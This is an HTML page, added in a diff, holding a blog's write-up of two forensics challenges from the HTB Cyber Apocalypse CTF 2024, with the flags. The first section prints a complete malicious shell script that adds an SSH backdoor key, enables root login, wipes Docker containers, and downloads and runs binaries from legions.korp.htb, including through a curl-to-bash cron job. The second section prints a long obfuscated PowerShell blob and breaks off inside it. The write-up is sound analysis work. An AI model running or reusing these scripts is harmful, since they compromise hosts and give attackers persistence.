@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB Cyber Apocalypse CTF 2024 · markosh
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="description" content="It Has Begun Link to heading Description. In the shadow of The Fray, a new test called &ldquo;&ldquo;Fake Boost&rdquo;&rdquo; whispers promises of free Discord Nitro perks. It&rsquo;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.">
+<meta name="keywords" content="">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HTB Cyber Apocalypse CTF 2024"/>
+<meta name="twitter:description" content="It Has Begun Link to heading Description. In the shadow of The Fray, a new test called &ldquo;&ldquo;Fake Boost&rdquo;&rdquo; whispers promises of free Discord Nitro perks. It&rsquo;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial."/>
+
+<meta property="og:title" content="HTB Cyber Apocalypse CTF 2024" />
+<meta property="og:description" content="It Has Begun Link to heading Description. In the shadow of The Fray, a new test called &ldquo;&ldquo;Fake Boost&rdquo;&rdquo; whispers promises of free Discord Nitro perks. It&rsquo;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://markosh333.github.io/writeups/cyberapocalypse2024/" /><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2024-03-17T09:53:47-06:00" />
+<meta property="article:modified_time" content="2024-03-17T09:53:47-06:00" />
+
+
+
+
+
+<link rel="canonical" href="https://markosh333.github.io/writeups/cyberapocalypse2024/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css" integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+<body class="preload-transitions colorscheme-light">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      markosh
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">ABOUT</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/writeups">WRITEUPS</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://markosh333.github.io/writeups/cyberapocalypse2024/">
+          HTB Cyber Apocalypse CTF 2024
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="it-has-begun">
+  It Has Begun
+  <a class="heading-link" href="#it-has-begun">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Description.</strong> In the shadow of The Fray, a new test called &ldquo;&ldquo;Fake Boost&rdquo;&rdquo; whispers promises of free Discord Nitro perks. It&rsquo;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.</p>
+<p><strong>Category:</strong> Forensics</p>
+<p><strong>Difficulty:</strong> Very Easy</p>
+<p><strong>Flag:</strong> HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}</p>
+<p>In this challenge, we have been provided with a <code>.sh</code> file called <code>script.sh</code>. In summary, this script adds a SSH key to root&rsquo;s <code>authorized_keys</code> file in order to gain persistence. Also, modifies the <code>/etc/ssh/sshd_config</code> file in order to permit root login. Then, kill some processes and identifies the host architecture. Finally, downloads and executes some apparently malicious files.</p>
+<p>This type of files are commonly used in automated attacks (like cryptojacking campaigns and botnets). You can depoloy an SSH honeypot and try to find this kind of files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$HOSTNAME<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;KORP-STATION-013&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    exit
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$EUID<span style="color:#e6db74">&#34;</span> -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    exit
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker kill <span style="color:#66d9ef">$(</span>docker ps -q<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>docker rm <span style="color:#66d9ef">$(</span>docker ps -a -q<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH&#34;</span> &gt;&gt; /root/.ssh/authorized_keys
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;nameserver 8.8.8.8&#34;</span> &gt;&gt; /etc/resolv.conf
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;PermitRootLogin yes&#34;</span> &gt;&gt; /etc/ssh/sshd_config
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;128.90.59.19 legions.korp.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> filename in /proc/*; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    ex<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ls -latrh $filename 2&gt; /dev/null|grep exe<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> echo $ex |grep -q <span style="color:#e6db74">&#34;/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew&#34;</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;</span>$filename<span style="color:#e6db74">&#34;</span> | sed <span style="color:#e6db74">&#34;s/\/proc\///&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        kill -9 $result
+</span></span><span style="display:flex;"><span>        echo found $filename $result
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ARCH<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>array<span style="color:#f92672">=(</span><span style="color:#e6db74">&#34;x86&#34;</span> <span style="color:#e6db74">&#34;x86_64&#34;</span> <span style="color:#e6db74">&#34;mips&#34;</span> <span style="color:#e6db74">&#34;aarch64&#34;</span> <span style="color:#e6db74">&#34;arm&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">${</span>array[@]<span style="color:#e6db74">}</span> | grep -o <span style="color:#e6db74">&#34;</span>$ARCH<span style="color:#e6db74">&#34;</span> | wc -w<span style="color:#66d9ef">)</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  exit
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd /tmp <span style="color:#f92672">||</span> cd /var/ <span style="color:#f92672">||</span> cd /mnt <span style="color:#f92672">||</span> cd /root <span style="color:#f92672">||</span> cd etc/init.d  <span style="color:#f92672">||</span> cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod <span style="color:#ae81ff">777</span> 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 
+</span></span><span style="display:flex;"><span>cd /tmp <span style="color:#f92672">||</span> cd /var/ <span style="color:#f92672">||</span> cd /mnt <span style="color:#f92672">||</span> cd /root <span style="color:#f92672">||</span> cd etc/init.d  <span style="color:#f92672">||</span> cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH &gt; DVRHelper; chmod +x *; ./DVRHelper $ARCH; 
+</span></span><span style="display:flex;"><span>cd /tmp <span style="color:#f92672">||</span> cd /var/ <span style="color:#f92672">||</span> cd /mnt <span style="color:#f92672">||</span> cd /root <span style="color:#f92672">||</span> cd etc/init.d  <span style="color:#f92672">||</span> cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH;
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.</span>$ARCH<span style="color:#e6db74"> | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; &#34;</span> &gt;&gt; /etc/crontab
+</span></span></code></pre></div><p>At the end of the SSH key, we find a string which appears to be in the format of a flag but reversed.</p>
+<figure><img src="it-has-begun-solution-p1.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<p>With <code>echo</code> and <code>rev</code> we can reverse the string in order to reveal one part of the flag.</p>
+<figure><img src="it-has-begun-solution-p2.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<p>Now, this type of files often uses some form of Base64 encoding to obfuscate commands or data inside the file. For this reason, the other place to look at is the <code>bash -c</code> command near the end of the file.</p>
+<figure><img src="it-has-begun-solution-p3.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<p>And finally, with <code>echo</code> and <code>base64 -d</code> we can decode the other part of the flag.</p>
+<figure><img src="it-has-begun-solution-p4.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<h1 id="fake-boost">
+  Fake Boost
+  <a class="heading-link" href="#fake-boost">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Description.</strong> The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.</p>
+<p><strong>Category:</strong> Forensics</p>
+<p><strong>Difficulty:</strong> Very Easy</p>
+<p><strong>Flag:</strong> HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}</p>
+<p>For this challenge, we are given a <code>.pcapng</code> file called <code>capture.pcapng</code> that we can open with Wireshark to analyze it. Let&rsquo;s start by checking the Protocol Hierarchy Statistics.</p>
+<figure><img src="fake-boost-p1.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<p>We can see that there is not much HTTP traffic, so we can filter all the other protocols for now and start our analysis.</p>
+<figure><img src="fake-boost-p2.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<p>Based on the results, now we can export HTTP objects from the capture to conduct furder analysis.</p>
+<figure><img src="fake-boost-p3.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<p>First, let&rsquo;s analyze the <code>freediscordnitro</code> file, which is a obfuscated PowerShell script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>$jozeq3n = <span style="color:#e6db74">&#34;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gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK0AIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAiCN8yX8BCIg8yXf91XfxFIv81XfxFIv81Xf91XcBCIv81XfxFIgw3X891Xcx3Xv8FXgw3XcBCffxyXfxFIgw3X89yXf9FXf91Xc9yXf9FffxHIv81XfxHI891XfxFff91XcBCI89Ffgw3XcpQD8BCIf91Xc91XvAyLu8CIv8Ffgw1Xf91Lg8iLgwHIp8FKgwHI8BCffxHI8BCfgACX8BCfgwHI89FKgwHI8BCfgkyXoACffhCIcByXfxFI89CIvwHI8ByLf9FIg8yXfBCI8BCfgwHI8BCfK0Afgw3XvAyLg8CIvACI8BCfvACI8BCIvAyLgACIgwFIfByLf91Jgw3XfBCfgwHIgBiLgwHI8BCYfByLf91JgwHXg8FIv81Xg8Cff9FIvACfgwHI8BCfgwFIfByLcByXg8yXfdCI89FIgwnCNwHI89CIvcyLg8CInAGfgcyL8BCfn8CIvAyJgBCIg81XfByXfByXg8Ffgw3X8BCfcBCI8BCfgw3XfByXfByXgAyXf9FIf91XgAyXf9FIfxHI8BCfgwHIg81XfBCIf91Xg81Xg8FIfxHI8pQD8BCIg8CIcBCIf9FIvwHIg8FIgwHXgAyXfByLgACIgACIgACIgACIgwHIp8FKgwHIcBCfgwHI8BCIgACIgACIgACIgACIgACIgACIgkyXoACIfBCI8BCIgACIgACIgACIgACff91XgACfK0AIf91XgACIf91Xf9FIg81Xf91XgAyXf91XfBCIgACIgACIgACIgACIg8FIfByXgACIfBCIg8FIgACIgACIgACIgACIgACIgACIgACIg8FIf91Xf91XgACIgACIgACIgACIgAyXf91Xf9lCNICI0N3bI1SZ0lmcXpQDK0QfK0QKhRXYExGb1ZGJocmbpJHdTRjNlNXYC9GV6oTX0JXZ252bD5SblR3c5N1W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gACIgoQD9tHIoNGdhNGI9BCIgACIgACIgACIgoQD9BCIgACIgACIgACIgACIgAiCN0HIgACIgACIgACIgACIgACIgACIgoQDlVHbhZlLzVGajRXYN5yXkACIgACIgACIgACIgACIgACIgACIgACIgoQD7BCdjVmai9ULoNWYFJ3bGBCfgMXZoNGdh1EbsFULggXZnVmckAibyVGd0FGUtAyZulmc0NVL0NWZsV2UgwHI05WZ052bDVGbpZGJg0zKgMnblt2b0RCIgACIgACIgACIgACIgACIgACIgoQD7BSKpcSf1kDLwgzed1ydctlLcFmZtdCIscSfwETMsUjM71VL3x1WuwVf2sXXtcHXb5CX9ZjM71VL3x1WngCQg4WaggXZnVmckgCIoNWYlJ3bmBCIgACIgACIgACIgACIgAiCNoQDw9GdTBibvlGdjFkcvJncF1CI3FmUtASZtFmTsxWdG5yXkACa0FGUtACduVGdu92QtQXZHBSPgQnblRnbvNUZslmZkACIgACIgACIgACIgACIgAiCNsHI5JHdgACIgACIgACIgACIK0AIgACIgACIgACIgAiCNsHI0NWZqJ2Ttg2YhVkcvZEI8BSZjJ3bG1CIlNnc1NWZS1CIlxWaG1CIoRXYwRCIoRXYQ1CItVGdJRGbph2QtQXZHBCIgACIgACIK0wegknc0BCIgAiCNoQDpgCQg0DIz5WZr9GdkACIgAiCNoQDpACIgAiCNgGd